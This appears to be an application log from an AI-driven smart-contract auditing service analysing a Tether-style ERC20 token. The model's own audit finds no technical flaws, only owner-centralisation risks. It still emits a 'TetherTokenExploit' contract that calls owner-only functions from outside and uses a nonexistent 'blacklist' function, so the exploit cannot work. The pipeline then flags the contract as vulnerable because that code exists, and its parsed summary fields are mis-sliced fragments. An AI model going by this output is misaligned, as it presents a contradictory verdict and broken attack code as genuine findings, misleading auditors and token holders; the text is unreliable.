"0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857894140000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. **Contract Analysis:**\n\nThe main contract with business logic and user funds is **TetherToken**, which is an ERC20 token contract with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- It supports pausing/unpausing by the owner.\n- It supports blacklisting addresses and destroying blacklisted funds.\n- It supports an upgrade mechanism via `deprecated` flag and forwarding calls to an upgraded contract.\n- It supports issuing and redeeming tokens by the owner.\n- It supports fees on transfers (basis points and max fee), though initially set to zero.\n- It uses `SafeMath` for arithmetic safety.\n- It has protections against short address attacks (`onlyPayloadSize` modifier).\n- It restricts approvals to mitigate the known ERC20 race condition.\n- Ownership and administrative functions are restricted to the owner.\n\nOther contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`, `SafeMath`) are standard utility or base contracts and do not hold funds or business logic beyond supporting `TetherToken`.\n\n2. **Vulnerability Assessment:**\n\n- **Centralized Control / Owner Privileges:**\n  - The owner has extensive control:\n    - Can pause/unpause the contract, halting all transfers.\n    - Can add/remove addresses from blacklist.\n    - Can destroy blacklisted users‚Äô tokens, effectively burning their balances.\n    - Can issue new tokens arbitrarily, increasing total supply and owner balance.\n    - Can redeem tokens, reducing total supply and owner balance.\n    - Can deprecate the contract and redirect calls to an upgraded contract.\n    - Can set transfer fee parameters.\n  - **Impact:** This centralization means the owner can censor users, freeze funds, burn tokens from blacklisted users, and inflate the token supply arbitrarily. This is a trust assumption and a potential economic risk for token holders.\n\n- **No Timelocks or Multisig for Owner Actions:**\n  - All owner functions are single-sig and immediate.\n  - **Impact:** If the owner key is compromised, attacker can perform all privileged actions instantly.\n\n- **Blacklisting and Destroying Funds:**\n  - The owner can blacklist any address and destroy its tokens.\n  - **Impact:** This can be used maliciously to confiscate tokens from any user without recourse.\n\n- **Upgrade Mechanism Risks:**\n  - The contract can be deprecated and calls forwarded to an upgraded contract.\n  - The upgrade address is set by the owner.\n  - No on-chain verification or user consent is required.\n  - **Impact:** Owner can redirect token operations to any contract, potentially malicious, causing loss of funds or unexpected behavior.\n\n- **No Reentrancy Issues:**\n  - The contract does not hold or send ETH.\n  - No external calls in state-changing functions that would cause reentrancy.\n  - SafeMath used everywhere.\n\n- **No Arithmetic Vulnerabilities:**\n  - SafeMath used for all arithmetic operations.\n  - Checks for overflows/underflows present.\n\n- **ERC20 Approve Race Condition Mitigation:**\n  - The `approve` function requires allowance to be zero before setting a non-zero value.\n  - This mitigates the known ERC20 race condition.\n\n- **Short Address Attack Mitigation:**\n  - `onlyPayloadSize` modifier used on transfer, transferFrom, approve.\n\n- **Fee Parameters:**\n  - Owner can set fees but capped to max 0.2% (basisPoints < 20) and max fee < 50 tokens (adjusted by decimals).\n  - Fees go to owner.\n  - Initially fees are zero.\n\n- **No ETH Handling:**\n  - Contract does not accept or hold ETH.\n  - No payable functions.\n\n3. **Exploitation Requirements:**\n\n- To exploit the centralization risks, an attacker must:\n  - Gain control of the owner private key.\n  - Or collude with the owner.\n\n- No direct technical exploits (reentrancy, overflow, underflow, etc.) are present.\n\n- Economic exploit:\n  - Owner can mint unlimited tokens via `issue()`, diluting existing holders.\n  - Owner can blacklist and destroy tokens of any user.\n  - Owner can pause the contract to freeze transfers.\n  - Owner can upgrade to malicious contract.\n\n- Setup for exploitation:\n  - Ownership compromise or malicious owner.\n  - No user action required.\n\n---\n\n**Summary:**\n\n- **Solidity version:** pragma solidity ^0.4.17;\n\n- **No technical vulnerabilities** such as reentrancy, arithmetic bugs, or unsafe calls detected.\n\n- **Centralization and owner privilege risks** are the main concern:\n  - Owner can mint tokens arbitrarily.\n  - Owner can blacklist and destroy user tokens.\n  - Owner can pause the contract.\n  - Owner can upgrade to a malicious contract.\n  - No multisig or timelock protections.\n\n- **Users must trust the owner** to act honestly; otherwise, funds can be frozen, destroyed, or diluted.\n\n# Final recommendation:\n\n- Consider adding multisig or timelock for owner functions.\n- Consider decentralizing control or adding governance.\n- Inform users of the centralized control risks.', 'reasoning': '**\n\nThe main contract with business logic and user funds is **TetherToken**, which is an ERC20 token contract with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- It supports pausing/unpausing by the owner.\n- It supports blacklisting addresses and destroying blacklisted funds.\n- It supports an upgrade mechanism via `deprecated` flag and forwarding calls to an upgraded contract.\n- It supports issuing and redeeming tokens by the owner.\n- It supports fees on transfers (basis points and max fee), though initially set to zero.\n- It uses `SafeMath` for arithmetic safety.\n- It has protections against short address attacks (`onlyPayloadSize` modifier).\n- It restricts approvals to mitigate the known ERC20 race condition.\n- Ownership and administrative functions are restricted to the owner.\n\nOther contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`, `SafeMath`) are standard utility or base contracts and do not hold funds or business logic beyond supporting `TetherToken`.\n\n2. **', 'summary': '**\n\n- **Centralized Control / Owner Privileges:**\n  - The owner has extensive control:\n    - Can pause/unpause the contract, halting all transfers.\n    - Can add/remove addresses from blacklist.\n    - Can destroy blacklisted users‚Äô tokens, effectively burning their balances.\n    - Can issue new tokens arbitrarily, increasing total supply and owner balance.\n    - Can redeem tokens, reducing total supply and owner balance.\n    - Can deprecate the contract and redirect calls to an upgraded contract.\n    - Can set transfer fee parameters.\n  - **Impact:** This centralization means the owner can censor users, freeze funds, burn tokens from blacklisted users, and inflate the token supply arbitrarily. This is a trust assumption and a potential economic risk for token holders.\n\n- **No Timelocks or Multisig for Owner Actions:**\n  - All owner functions are single-sig and immediate.\n  - **Impact:** If the owner key is compromised, attacker can perform all privileged actions instantly.\n\n- **Blacklisting and Destroying Funds:**\n  - The owner can blacklist any address and destroy its tokens.\n  - **Impact:** This can be used maliciously to confiscate tokens from any user without recourse.\n\n- **Upgrade Mechanism Risks:**\n  - The contract can be deprecated and calls forwarded to an upgraded contract.\n  - The upgrade address is set by the owner.\n  - No on-chain verification or user consent is required.\n  - **Impact:** Owner can redirect token operations to any contract, potentially malicious, causing loss of funds or unexpected behavior.\n\n- **No Reentrancy Issues:**\n  - The contract does not hold or send ETH.\n  - No external calls in state-changing functions that would cause reentrancy.\n  - SafeMath used everywhere.\n\n- **No Arithmetic Vulnerabilities:**\n  - SafeMath used for all arithmetic operations.\n  - Checks for overflows/underflows present.\n\n- **ERC20 Approve Race Condition Mitigation:**\n  - The `approve` function requires allowance to be zero before setting a non-zero value.\n  - This mitigates the known ERC20 race condition.\n\n- **Short Address Attack Mitigation:**\n  - `onlyPayloadSize` modifier used on transfer, transferFrom, approve.\n\n- **Fee Parameters:**\n  - Owner can set fees but capped to max 0.2% (basisPoints < 20) and max fee < 50 tokens (adjusted by decimals).\n  - Fees go to owner.\n  - Initially fees are zero.\n\n- **No ETH Handling:**\n  - Contract does not accept or hold ETH.\n  - No payable functions.\n\n3. **', 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function issue(uint amount) external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function pause() external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgraded) public {\n        target.issue(1000000 ether);\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.pause();\n        target.deprecate(upgraded);\n    }\n}', 'code_type': 'solidity', 'duration': 26.31561851501465}
2025-07-05 13:14:22,695 - app.services.contract_service - INFO - Has exploit code: True
2025-07-05 13:14:22,696 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 13:14:22,698 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 13:14:22,699 - app.services.contract_service - INFO - Attack strategy summary: **

- **Centralized Control / Owner Privileges:**
  - The owner has extensive control:
    - Can pause/unpause the contract, halting all transfers.
    - Can add/remove addresses from blacklist.
    - Can destroy blacklisted users‚Äô tokens, effectively burning their balances.
    - Can issue new tokens arbitrarily, increasing total supply and owner balance.
    - Can redeem tokens, reducing total supply and owner balance.
    - Can deprecate the contract and redirect calls to an upgraded contract.
    - Can set transfer fee parameters.
  - **Impact:** This centralization means the owner can censor users, freeze funds, burn tokens from blacklisted users, and inflate the token supply arbitrarily. This is a trust assumption and a potential economic risk for token holders.

- **No Timelocks or Multisig for Owner Actions:**
  - All owner functions are single-sig and immediate.
  - **Impact:** If the owner key is compromised, attacker can perform all privileged actions instantly.

- **Blacklisting and Destroying Funds:**
  - The owner can blacklist any address and destroy its tokens.
  - **Impact:** This can be used maliciously to confiscate tokens from any user without recourse.

- **Upgrade Mechanism Risks:**
  - The contract can be deprecated and calls forwarded to an upgraded contract.
  - The upgrade address is set by the owner.
  - No on-chain verification or user consent is required.
  - **Impact:** Owner can redirect token operations to any contract, potentially malicious, causing loss of funds or unexpected behavior.

- **No Reentrancy Issues:**
  - The contract does not hold or send ETH.
  - No external calls in state-changing functions that would cause reentrancy.
  - SafeMath used everywhere.

- **No Arithmetic Vulnerabilities:**
  - SafeMath used for all arithmetic operations.
  - Checks for overflows/underflows present.

- **ERC20 Approve Race Condition Mitigation:**
  - The `approve` function requires allowance to be zero before setting a non-zero value.
  - This mitigates the known ERC20 race condition.

- **Short Address Attack Mitigation:**
  - `onlyPayloadSize` modifier used on transfer, transferFrom, approve.

- **Fee Parameters:**
  - Owner can set fees but capped to max 0.2% (basisPoints < 20) and max fee < 50 tokens (adjusted by decimals).
  - Fees go to owner.
  - Initially fees are zero.

- **No ETH Handling:**
  - Contract does not accept or hold ETH.
  - No payable functions.

3. **
2025-07-05 13:14:22,701 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 13:14:22,702 - app.services.contract_service - INFO - Temporary file /tmp/tmpfo1636da.sol removed
2025-07-05 13:14:22,720 - app.api.contract - INFO - Report saved with filename: Ownable_2025-07-05_13-14, status: KO
2025-07-05 13:14:22,721 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-07-05 13:14:22,723 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:14:22,725 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:14:22,726 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:14:22,727 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:14:22,729 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:14:22] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:15:14,138 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:15:14,145 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:15:14,146 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:15:14,148 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:15:14,150 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:15:14] "GET /history HTTP/1.1" 200 -
2025-07-05 13:15:20,680 - flask_cors.extension - DEBUG - Request to ''/analysis/status/3'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:15:20,686 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:15:20,689 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:15:20,693 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
